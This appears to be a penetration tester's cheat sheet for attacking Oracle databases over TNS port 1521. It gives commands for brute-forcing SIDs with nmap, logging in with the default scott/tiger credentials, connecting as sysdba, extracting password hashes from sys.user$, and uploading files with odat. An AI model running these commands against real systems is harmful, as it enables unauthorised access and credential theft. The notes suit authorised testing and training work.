
TNS
	Transparent Network Substrate
Tools
	odat (oracle database attack tool)
Port
	1521
SID Bruteforcing
	sudo nmap -p1521 -sV x.x.x.x --open --script oracle-sid-brute
Interaction
	Use sqlplus to connect
		scott/tiger@x.x.x.x/XE
CMDS
	https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985
Elevated Privileged 
	sysdba
		sqlplus user/pass@x.x.x.x/XE as sysdba
Extracting Password Hashes
	select name, password from sys.user$;
File Upload
	./odat.py utlfile -s x.x.x.x -d XE -U scott -P tiger --sysdba --putFile remotePath exportfName localFile 